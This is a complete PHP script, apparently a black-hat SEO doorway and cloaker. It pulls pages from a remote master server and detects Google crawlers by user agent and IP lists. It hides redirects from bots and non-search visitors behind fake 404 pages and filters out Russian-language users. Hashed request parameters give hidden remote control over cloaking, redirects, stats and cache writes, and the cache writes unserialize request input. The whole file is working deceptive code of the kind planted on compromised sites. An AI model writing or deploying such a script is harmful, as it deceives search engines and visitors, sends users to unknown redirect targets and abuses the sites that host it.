<?php
error_reporting(0);
ini_set('display_errors', 0);
header('Content-type: text/html; charset=utf-8');
header('Pragma: no-cache');
header('Cache-Control: no-cache');
set_magic_quotes_runtime(0);

if (!function_exists('file_get_contents')) {
  function file_get_contents($file) {
    $sz = @filesize($file);
    $hf = fopen($file, 'r');
    if (!$hf)
      return false;
    $txt = '';
    while (strlen($buf = fread($hf, $sz)) > 0) {
      $txt .= $buf;
    }
    fclose($hf);
    return $txt;
  }
}

class RemotePage
{
  //var $myUrl = 'http://your-domain.com/door_sample/';
  //var $feedUrl = 'http://www.your-feed-domain.com/path/to/${key}/';
  var $cacheDir = '.cache';
  var $varName = 'ie';
  var $waitTimeout = 60; // seconds
  var $useCurl = 0;
  
  var $googleRefNumToAllowRedirect = 100;
  var $googleRefNumToAllowCloak = 100;
  var $cloakMethod = 4; // 1 - 404 old, 2 - hides redirect for bots, 3 - 404 new, 4 - hides redirect for bots and non-google-refs
  
  var $keywordSeparator = '-';
  var $defaultPage = 'index';
  var $searchReferers = 'live|msn|yahoo|google|ask|aol';
  var $botIps = Array(
    /* 2009-12-12 */ '66\.249\.[6-9][0-9]\.[0-9]+', '74\.125\.[0-9]+\.[0-9]+', '38\.[0-9]+\.[0-9]+\.[0-9]+', '70\.91\.180\.25', '65\.93\.62\.242', '74\.193\.246\.129', '213\.144\.15\.38', '195\.92\.229\.2', '70\.50\.189\.191', '218\.28\.88\.99', '165\.160\.2\.20', '89\.122\.224\.230', '66\.230\.175\.124', '218\.18\.174\.27', '65\.33\.87\.94', '67\.210\.111\.241', '81\.135\.175\.70', '64\.69\.34\.134', '89\.149\.253\.169', '69\.136\.208\.89', '83\.15\.211\.166', '78\.180\.145\.80', '78\.166\.111\.63', '64\.233\.1[6-8][1-9]\.[0-9]+', '64\.233\.19[0-1]\.[0-9]+', '209\.185\.108\.[0-9]+', '209\.185\.253\.[0-9]+', '209\.85\.238\.[0-9]+', '216\.239\.33\.9[6-9]', '216\.239\.37\.9[8-9]', '216\.239\.39\.9[8-9]', '216\.239\.41\.9[6-9]', '216\.239\.45\.4', '216\.239\.46\.[0-9]+', '216\.239\.51\.9[6-9]', '216\.239\.53\.9[8-9]', '216\.239\.57\.9[6-9]', '216\.239\.59\.9[8-9]', '216\.33\.229\.163', '64\.233\.173\.[0-9]+', '64\.68\.8[0-9]\.[0-9]+', '64\.68\.9[0-2]\.[0-9]+', '72\.14\.199\.[0-9]+', '8\.6\.48\.[0-9]+', '207\.211\.40\.82', '67\.162\.158\.146', '66\.255\.53\.123', '24\.200\.208\.112', '129\.187\.148\.240', '129\.187\.148\.244', '199\.126\.151\.229', '118\.124\.32\.193', '89\.149\.217\.191',
  );
  
  // !!! DO NOT CHANGE THIS !!!
  var $seal = '7aY#4EwrU_eC2AbEcuP?8keYe&ruQuxE=R46eQ38eHE27aZeFr7W7eSp=752xen?';
  
  function RemotePage()
  {
    if (!$this->cacheDir)
      $this->cacheDir = dirname(__FILE__) . '/';
  }
  
  function genRandomString() {
  	$len = mt_rand(3, 12);
  	$chr = 'abcdefghijklmnopqrstuvwxyz0123456789';
  	$nchr = strlen($chr) - 1;
  	$res = '';
  	for ($i = 0; $i < $len; ++$i) {
  		$res .= $chr[ mt_rand(0, $nchr) ];
  	}
  	return $res;
  }
  
  function genRandomString2() {
  	$res = "";
  	for($i = 0; $i < 4; $i ++) {
  		$m = ($i % 2 == 0) ? 10 : 5;
  		$cc = array (
  				rand ( 97, 122 ),
  				rand ( 97, 122 ),
  				rand ( 97, 122 )
  		);
  		do
  			$cc [3] = rand ( 97, 122 ); while ( ($cc [0] + $cc [1] + $cc [2] + $cc [3]) % $m != 0 );
  		foreach ( $cc as $ii => $c )
  			$res .= chr ( $c );
  	}
  	return $res;
  }
  
  function _processReferer() {
    if ($this->checkGoogleRef()) {
      $cnt = $this->_increaseStats('refgg');
      if ($cnt != -1 && $cnt >= $this->googleRefNumToAllowRedirect && !$this->_isRedirectRequired()) {
        $this->_allowRedirectByGoogle();
      };
      if ($cnt != -1 && $cnt >= $this->googleRefNumToAllowCloak && !$this->_isCloaked()) {
        $this->_allowCloakByGoogle();
      };
      return true;
    };
    return false;
  }
  
  function _processUserAgent() {
    if ($this->checkGoogleBot()) {
      $cnt = $this->_increaseStats('uagg');
      return true;
    }
    /*else if ($this->checkOtherBot()) {
      $cnt = $this->_increaseStats('uaor');
      return true;
    }/**/
    return false;
  }
  
  function _testUaLang() {
    if (preg_match('/[; ]ru[\-; ]/i', $_SERVER['HTTP_USER_AGENT']))
      return false;
    if (preg_match('/windows-1251|koi8-r/i', $_SERVER['HTTP_ACCEPT_CHARSET']))
      return false;
    return true;
  }
  
  function _detectBannedUser() {
    if (!$this->_testUaLang())
      return true;
    if (array_key_exists('auth_4cf53d2265656779cb52187db1f69d87', $_COOKIE) && ($_COOKIE['auth_4cf53d2265656779cb52187db1f69d87'] == 'failed' || $_COOKIE['auth_4cf53d2265656779cb52187db1f69d87'] != 1))
      return true;
    return false;
  }
  
  function _processMissed($refResult, $uaResult) {
  	if ($refResult && $uaResult) {
      $cnt = $this->_increaseStats('missgg');
      return true;
  	}
  	return false;
  }
  
  function _increaseStats($stat) {
    $cnt = -1;
    $hf = @fopen("{$this->cacheDir}/.{$stat}", "a+");
    if (false == $hf)
      return -1;
    if (!@flock($hf, LOCK_EX)) {
      @fclose($hf);
      return -1;
    };
    fseek($hf, 0);
    $cnt = intval(fgets($hf));
    fseek($hf, 0);
    ftruncate($hf, 0);
    ++$cnt;
    fwrite($hf, strval($cnt));
    fclose($hf);
    return $cnt;
  }
  
  function _getStats($stat) {
    $cnt = -1;
    $hf = @fopen("{$this->cacheDir}/.{$stat}", "r");
    if (false == $hf)
      return -1;
    if (!@flock($hf, LOCK_SH)) {
      @fclose($hf);
      return -1;
    };
    fseek($hf, 0);
    $cnt = intval(fgets($hf));
    fclose($hf);
    return $cnt;
  }
  
  function _allowRedirectByGoogle() {
    $status = $this->allowRedirect('enable');
    if ($status == 'nocachedir' || $status == 'enabled')
    {
      $url = $this->masterUrl . 'remote.php?u=' . urlencode($this->myUrl) . '&a=enable_redirect';
      $req = new HttpRequest($this->useCurl ? 0 : 1, $this->waitTimeout);
      $page = $req->request($url);
      if (!$page)
        return false;
      return true;
    };
    return false;
  }
  
  function _allowCloakByGoogle() {
    $status = $this->allowCloak('enable');
    if ($status == 'nocachedir' || $status == 'enabled') {
      $url = $this->masterUrl . 'remote.php?u=' . urlencode($this->myUrl) . '&a=enable_cloak';
      $req = new HttpRequest($this->useCurl ? 0 : 1, $this->waitTimeout);
      $page = $req->request($url);
      if (!$page)
        return false;
      return true;
    };
    return false;
  }
  
  function _clearCache() {
    if (! ($hd = opendir($this->cacheDir)))
    {
      return 'error';
    };
    $res = 'ok';
    while ($fname = readdir($hd)) {
      if (!preg_match('/\.cache$/', $fname))
        continue;
      $fpath = $this->cacheDir . '/' . $fname;
      if (!unlink($fpath))
        $res = 'err';
    }
    closedir($hd);
    return $res;
  }
  
  function _getCachedPage($pagename) {
    $pagename = strtr($pagename, " \t", "___");
    $page = file_get_contents("{$this->cacheDir}/{$pagename}.cache");
    if (false == $page) {
      return false;
    };
    $page = unserialize($page);
    if ($page['seal'] != $this->seal) {
      @unlink("{$this->cacheDir}/{$pagename}.cache");
      return false;
    };
    $this->cacheStatus = 'EXISTS';
    //@header("X-Page-Cached: exists");
    return $page;
  }
  
  function _cachePage($pagename, $page) {
    //echo "Caching page [$pagename]\n";
    if ($page['error']) {
      @header("X-Page-Cached: failure");
      return false;
    };
    unset($page['redirect_disabled']);
    unset($page['cloaked']);
    $pagename = strtr($pagename, " \t", "___");
    $hf = @fopen("{$this->cacheDir}/{$pagename}.cache", "wb");
    if (!$hf) {
      @header("X-Page-Cached: failure");
      return false;
    };
    fwrite($hf, serialize($page));
    fclose($hf);
    @header("X-Page-Cached: success");
    return true;
  }
  
  function _getRemotePage($pagename, $forceReCache) {
    if ($forceReCache || false == ($page = $this->_getCachedPage($pagename))) {
      $url = $this->masterUrl . 'gw.php?u=' . urlencode($this->myUrl) . '&p=' . urlencode($pagename) . '&s=1';
      $req = new HttpRequest($this->useCurl ? 0 : 1, $this->waitTimeout);
      $page = $req->request($url);
      //echo $page;
      if (!$page)
        return false;
      $page = unserialize($page);
      if ($page['seal'] != $this->seal) {
        return false;
      }
      $this->redirectDisabled = $page['redirect_disabled'];
      $this->cloaked = $page['cloaked'];
      $this->cacheStatus = $this->_cachePage($pagename, $page) ? 'SUCCESS' : 'FAILURE';
    };
    return $page; 
  }
  
  function _isRedirectRequired($referer) {
    // Detecting whether redirect is required
    if (is_file($this->cacheDir . '/.noredir') || $this->redirectDisabled == 'disabled')
      return false;
    else
      return true;
  }
  
  function _isCloaked($referer) {
    // Detecting whether cloak is required
    if (is_file($this->cacheDir . '/.cloak') || $this->cloaked == 'cloaked')
      return true;
    else
      return false;
  }
  
  function checkGoogleRef()
  {
    $url = parse_url($_SERVER['HTTP_REFERER']);
    if (preg_match('/(^|\.)google\./i', $url['host']))
  	{
  	  $args = Array();
  	  parse_str($url['query'], $args);
  	  /*
  	  if (count($args) < 2)
  	    return false;
  	  */
  	  if (preg_match('/(^|\s)site:/i', $args['q']))
  	   return false;
  	  return true;
  	}
  	return false;
  }
  
  // http://search.yahoo.com/search?p=the+matrix+movie&toggle=1&cop=mss&ei=UTF-8&fr=yfp-t-701
  
  function checkOtherRef()
  {
    if (strpos($_SERVER['HTTP_REFERER'], 'search') !== false) {
      return true;
    };
    if (strpos($_SERVER['HTTP_REFERER'], 'ask.com') !== false) {
      return true;
    };
    $url = parse_url($_SERVER['HTTP_REFERER']);
    if (preg_match('/(^|\.)yahoo\./i', $url['host'])) {
      return true;
    }
    return false;
  }
    
  function checkGoogleBot()
  {
  	if (
  				false !== stripos($_SERVER['HTTP_USER_AGENT'], 'Google')
//  				|| false !== stripos($_SERVER['HTTP_USER_AGENT'], 'AdsBot-Google')
  				|| false !== stripos($_SERVER['HTTP_USER_AGENT'], 'gsa-crawler')
  				|| false !== stripos($_SERVER['HTTP_USER_AGENT'], 'http://www.googlebot.com/bot.html')
  				|| false !== stripos($_SERVER['HTTP_USER_AGENT'], 'http://www.google.com/bot.html')
  		)
  		return true;
  	$ip = $_SERVER['REMOTE_ADDR'];
  	foreach ($this->botIps as $botIp) {
  		if (preg_match("/^{$botIp}/", $ip)) {
  			return true;
  		}
  	}
  	return false;
  }
  
  function checkOtherBot() {
  	if (
  				false !== stripos($_SERVER['HTTP_USER_AGENT'], 'yahoo')
  				|| false !== stripos($_SERVER['HTTP_USER_AGENT'], 'slurp')
  				|| false !== stripos($_SERVER['HTTP_USER_AGENT'], 'bot')
  		)
  		return true;
    return false;
  }
    
  function allowRedirect($allow) {
    if ($allow == 'disable')
      touch($this->cacheDir . '/.noredir');
    else
      unlink($this->cacheDir . '/.noredir');
    if (!is_dir($this->cacheDir) || !is_writable($this->cacheDir))
      return 'nocachedir';
    return (file_exists($this->cacheDir . '/.noredir') ? 'disabled' : 'enabled');
  }
  
  function allowCloak($allow) {
    if ($allow == 'enable')
      @touch($this->cacheDir . '/.cloak');
    else
      @unlink($this->cacheDir . '/.cloak');
    if (!is_dir($this->cacheDir) || !is_writable($this->cacheDir))
      return 'nocachedir';
    return (file_exists($this->cacheDir . '/.cloak') ? 'enabled' : 'disabled');
  }
  
  function die404()
  {
    header("{$_SERVER['SERVER_PROTOCOL']} 404 Not Found");
    die( <<<EOM
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.</p>
<hr>
<address>{$_SERVER['SERVER_SOFTWARE']} Server at {$_SERVER['SERVER_NAME']} Port {$_SERVER['SERVER_PORT']}</address>
</body></html>
EOM
			);
  }
  
  function getIframedPage($url) {
      $req = new HttpRequest($this->useCurl ? 0 : 1, $this->waitTimeout);
      $page = $req->request($url);
      if (!$page)
        return false;
      $page = preg_replace('/<base\s+href\s*=\s*("[^"]+"|\S+)[^>]*>/is', '', $page);
      $page = preg_replace('/<base\s+target\s*=\s*("[^"]+"|\S+)[^>]*>/is', '', $page);
      $pos = stripos($page, '<head');
      if ($pos === false)
        $pos = 0;
      else
        $pos = strpos($page, '>', $pos + 5);
      if ($pos === false)
        $pos = 0;
      else
        ++$pos;
      $page = substr($page, 0, $pos) . "<base href=\"{$url}\" /> <base target=\"_parent\" />" . substr($page, $pos);
      return $page;
  }
  
  function displayPage($pagename, $referer, $cacheOnly, $forceReCache)
  {
    if ($pagename == '')
      $pagename = $this->defaultPage;
    $page = Array();
    $isGoogleRef = $this->_processReferer();
    $isOtherRef = $this->checkOtherRef();
    $isRef = $isGoogleRef || $isOtherRef;
    $isGoogleBot = $this->_processUserAgent();
    $isOtherBot = $this->checkOtherBot();
    $isBot = $isGoogleBot || $isOtherBot;
    $isBannedUser = $this->_detectBannedUser();
    $cloaked = $this->_isCloaked();
    $hideRedirect = false;
    $this->_processMissed($isGoogleRef, $isBot);
    
    if (!$cacheOnly) {
      switch ($this->cloakMethod) {
      case 2: // Hide redirect for bots
        if ($isBot && $cloaked) {
          $hideRedirect = true;
        };
        //$page['page'] = str_replace('$[[REDIRECT]]', '', $page['page']);
        break;
      case 4: // Hide redirect for bots and non-google referers
        if ($cloaked && ($isBot || !$isRef)) {
          $hideRedirect = true;
        };
        if ($isBannedUser) {
          if ($cloaked) {
            //echo "Wrong user: $isBannedUser; $isGoogleRef; {$this->isJavaScript}<br>\n";
            $hideRedirect = true;
          }
        }
        if (!$isBot) {
          //echo "new404: bot not detected;<br>\n";
          if ($isRef xor $this->isJavaScript) {
            //echo "Normal user<br>\n";
          }
          else if ($cloaked) {
            //echo "Wrong user: $isBannedUser; $isGoogleRef; {$this->isJavaScript}<br>\n";
            $hideRedirect = true;
          }
        }
        else { // BOT detectet
          //echo "new404: bot detected;<br>\n";
          $hideRedirect = true;
          if ($this->isJavaScript)
          {
            //$this->die404();
          }
        }
        break;
      case 3: // New 404 - for users
        if ($isBannedUser) {
          if ($cloaked) {
            //echo "Wrong user: $isBannedUser; $isGoogleRef; {$this->isJavaScript}<br>\n";
            if ($_COOKIE['auth_4cf53d2265656779cb52187db1f69d87'] != 'failed') {
              setcookie('auth_4cf53d2265656779cb52187db1f69d87', 'failed', time() + 60 * 60 * 24 * 2000);
            }
            $this->die404();
          }
        }
        if (!$isBot) {
          //echo "new404: bot not detected;<br>\n";
          if ($isRef xor $this->isJavaScript) {
            //echo "Normal user<br>\n";
            if ($_COOKIE['auth_4cf53d2265656779cb52187db1f69d87'] != 1) {
              setcookie('auth_4cf53d2265656779cb52187db1f69d87', 1, time() + 60 * 60 * 24 * 2000);
            }
            // TODO: redirect should go here
            // header("Location: {$page['redirect_url']}");
          }
          else if ($cloaked) {
            //echo "Wrong user: $isBannedUser; $isGoogleRef; {$this->isJavaScript}<br>\n";
            if ($_COOKIE['auth_4cf53d2265656779cb52187db1f69d87'] != 'failed') {
              setcookie('auth_4cf53d2265656779cb52187db1f69d87', 'failed', time() + 60 * 60 * 24 * 2000);
            }
            $this->die404();
          }
        }
        else { // BOT detectet
          //echo "new404: bot detected;<br>\n";
          $hideRedirect = true;
          if ($this->isJavaScript)
          {
            $this->die404();
          }
        }
        break;
      default: // Old 404 - for bots
        if ($isBot && $cloaked) {
          $this->die404();
        }
        break;
      }
    }
    
    $page = $this->_getRemotePage($pagename, $forceReCache);
    if ($page === false || $page['error']) {
      if ($cacheOnly)
        die("PAGE CACHING RESULT: FAILURE\n");
      if ($this->feedUrl) {
        $url = str_replace('${key}', str_replace($this->keywordSeparator, '%20', $pagename), $this->feedUrl);
        header("Location: {$url}");
        die();
      }
      $this->die404();
    };
    if ($this->isJavaScript && $page['type'] == 'iframe') {
      $url = str_replace('${arg}', $_REQUEST['a'], $page['url']);
      $url = str_replace('${rstr}', $this->genRandomString2(), $url);
      
      $page['page'] = $this->getIframedPage($url); // 'IFRAME CONTENTS GOES HERE';
    }
    else {
      if ($this->isJavaScript)
        header('Content-type: text/javascript');
      
      if ($cacheOnly)
        die("PAGE CACHING RESULT: {$this->cacheStatus}\n");
        
      if (!$this->_isRedirectRequired($referer))
        $hideRedirect = true;
      if (!$hideRedirect && ($page['redirect_type'] == 'http' || $page['redirect_type'] == 'http_noref')) {
        $scr = new RemotePage();
        $script = $scr->_getRemotePage($page['script_filename'], false);
        if ($script['seal'] != $scr->seal) {
          //echo "Seal mismatch!<br>\n";
          $this->die404();
        }
        $url = str_replace('${arg}', urlencode_ns($page['script_arg']), $script['url']);
        $url = str_replace('${arg_r}', $page['script_arg'], $url);
        $url = str_replace('${rstr}', $this->genRandomString2(), $url);
        
        $self_url = 'http://' . ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']) . $_SERVER['REQUEST_URI'];
        $url = str_replace('${url}', urlencode($self_url), $url);
        $url = str_replace('${ref}', urlencode($_SERVER['HTTP_REFERER']), $url);
        header("Location: {$url}");
      }
      $page['page'] = str_replace('$[[REDIRECT]]', $hideRedirect ? '' : $page['script'], $page['page']);
      if (!$hideRedirect && $page['redirect_type'] == 'iframe') {
        $arg = urlencode_ns($page['script_arg']);
        $script_url = '';
        if (!preg_match('/\.html$/', $_SERVER['REQUEST_URI']))
          $script_url = $_SERVER['PHP_SELF'] . '?' . $this->varName . '=' . $page['script_filename'] . '&a=' . $arg;
        else
          $script_url = $page['script_filename'] . '?a=' . $arg;
        //print_r($_SERVER);
        echo "<iframe width=\"100%\" height=\"99%\" border=\"0\" style=\"border:none\" src=\"{$script_url}\"></iframe>";
        $pos = stripos($page['page'], '<body');
        if ($pos !== false) {
          $pos = strpos($page['page'], '>', $pos);
          if ($pos === false) {
            $pos = 0;
          }
        }
        else {
          $pos = 0;
        }
        $str = ' style="margin:0px;padding:0px;width:100%;height:100%;background:white"';
        $page['page'] = substr($page['page'], 0, $pos) . $str . substr($page['page'], $pos);
        $pos += 1 + strlen($str);
        $str = '<script>document.write("<noscript>");</script>';
        $page['page'] = substr($page['page'], 0, $pos) . $str . substr($page['page'], $pos);
      }
    };
    echo $page['page'];
  }
  
  function processRequest($p, $referer, $cacheOnly, $forceReCache)
  {
  	if (preg_match('/\.js$/', $p)) {
  	  $this->isJavaScript = true;
  	}
  	$this->displayPage($p, $referer, $cacheOnly, $forceReCache);
  }
};

class HttpRequest
{
  // Request mode, 0 - use CURL, 1 - use SOCKETS
  var $mode = 0;
  var $timeout = -1;
  function HttpRequest($mode = 0, $timeout = -1)
  {
    $this->mode = ($mode == 0 && function_exists('curl_init') ? 0 : 1);
    $this->timeout = $timeout;
  }

  function _connect($host, $port) {
    $errno = null;
    $errstr = null;
    $hf = fsockopen($host, $port ? $port : 80, $errno, $errstr, $this->timeout);
    return $hf;
  }
  
  function _disconnect($hs) {
    fclose($hs);
  }
  
  function request($url, $post_data = false) {
    switch ($this->mode)
    {
    case 0:
      return $this->_requestCurl($url, $post_data);
    case 1:
      return $this->_requestSock($url, $post_data);
    default:
      return false;
    };
  }
  
  function _requestCurl($url, $post_data) {
    $hc = curl_init($url);
    //echo "URL: [{$url}]<br>\n";
    if ($post_data)
      curl_setopt($hc, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($hc, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($hc, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($hc, CURLOPT_AUTOREFERER, 1);
    curl_setopt($hc, CURLOPT_CONNECTTIMEOUT, $this->timeout);
    $res = curl_exec($hc);
    $this->httpStatus = curl_getinfo($hc, CURLINFO_HTTP_CODE);
    //echo "Status: {$this->httpStatus}<br>\n";
    curl_close($hc);
    return $res;
  }
  
  function _requestSock($url, $post_data) {
    $info = parse_url($url);
    $httpHostStr = $info['host'];
    if ($info['port'])
      $httpHostStr .= ':' . $info['port'];
    if (!empty($post_data)) {
      $rtype = 'POST';
      $post = array();
      foreach ($post_data as $key => $val)
      {
        $post[] = urlencode($key) . '=' . urlencode($val);
      };
      $post = implode('&', $post);
      $contentLength = strlen($post);
      $content = "Content-Type: application/x-www-form-urlencoded\nContent-length: " . strlen($post) . "\n\n" . $content;
    }
    else {
      $rtype = 'GET';
      $post = '';
      $content = "\n";
    };
    $req = <<<EOR
{$rtype} {$url} HTTP/1.0
Host: {$httpHostStr}
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.10) Gecko/20071115 Firefox/2.0.0.10
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8
Accept-Language: en
{$content}
EOR;
    //echo "REQUEST:<br>\n---<pre>{$req}</pre>\n";
    $hc = $this->_connect($info['host'], $info['port']);
    if (!$hc) {
      trigger_error("Failed to connect to [{$info['host']}]", E_USER_WARNING);
      return false;
    };
    fwrite($hc, $req);
    $res = '';
    while (!feof($hc))
      $res .= fread($hc, 8192);
    $this->_disconnect($hc);
    if (preg_match('/^HTTP\/[^\s]+\s+(\d+)/', $res, $match)) {
      $this->httpStatus = $match[1];
    }
    else {
      $this->httpStatus = 666;
      return false;
    };
    //echo "Status: {$this->httpStatus}<br>\n";
    if (preg_match('/^.+?(?:\r\n\r\n|\n\n)(.*)$/ms', $res, $match)) {
      return $match[1];
    };
    $this->httpStatus = 666;
    return false;
  }
};

function unslash_rec(&$arr) {
  reset($arr);
  while (list($key)=each($arr)) {
    if (is_array($arr[$key]))
      unslash_rec($arr[$key]);
    else {
      $arr[$key]=stripslashes($arr[$key]);
    };
  };
};

if (!function_exists('stripos')) {
  function stripos($haystack, $needle, $pos = null) {
    return strpos(strtolower($haystack), strtolower($needle), $pos);
  }
}

function urlencode_ns($str) {
  return str_replace('%2F', '/', urlencode($str));
}

if (get_magic_quotes_gpc()) {
  unslash_rec($_GET);
  unslash_rec($_POST);
  unslash_rec($_REQUEST);
  unslash_rec($_COOKIE);
  foreach ($_FILES as $key => $val)
    $_FILES[$key]['name'] = stripslashes($_FILES[$key]['name']);
};

function escapePageName($page) {
  return preg_replace('/[\x00-\x19\\/]|\.(?!js$)/', '-', $page);
}

$page = new RemotePage();

$_REQUEST[$page->varName] = escapePageName($_REQUEST[$page->varName]);

if (array_key_exists('d98a70509b4b1552243f07629a643439_redir', $_REQUEST)) {
  $status = $page->allowRedirect($_REQUEST['d98a70509b4b1552243f07629a643439_redir']);
  die("REDIRECT [d98a70509b4b1552243f07629a643439_redir] STATUS: [{$status}]\n");
}
else if (array_key_exists('d98a70509b4b1552243f07629a643439_cloak', $_REQUEST)) {
  $status = $page->allowCloak($_REQUEST['d98a70509b4b1552243f07629a643439_cloak']);
  die("CLOAK [d98a70509b4b1552243f07629a643439_cloak] STATUS: [{$status}]\n");
}
else if ($_REQUEST['d98a70509b4b1552243f07629a643439_gref'] == 'count') {
  $cnt = $page->_getStats('refgg');
  $cnt2 = $page->_getStats('uagg');
  $cnt3 = $page->_getStats('missgg');
  die("GREF [d98a70509b4b1552243f07629a643439_gref] COUNT: [{$cnt}]\nGUA [d98a70509b4b1552243f07629a643439_gua] COUNT: [{$cnt2}]\nGMISS [d98a70509b4b1552243f07629a643439_gmiss] COUNT: [{$cnt3}]\n");
}
else if ($_POST['d98a70509b4b1552243f07629a643439_direct_cache'] == 'cache') {
  $status = $page->_cachePage($_REQUEST[$page->varName], unserialize($_REQUEST['d98a70509b4b1552243f07629a643439_page']));
  die("CACHE [d98a70509b4b1552243f07629a643439_direct_cache] STATUS: [{$status}]\n");
}
else if ($_POST['d98a70509b4b1552243f07629a643439_clear_cache'] == 'clear') {
  $status = $page->_clearCache();
  die("CLEAR CACHE [d98a70509b4b1552243f07629a643439_clear_cache] STATUS: [{$status}]\n");
}
else {
  $page->processRequest($_REQUEST[$page->varName], $_SERVER['HTTP_REFERER'], $_REQUEST['__cacheonly'] == 'true', $_REQUEST['__forcerecache'] == 'true');
};

?>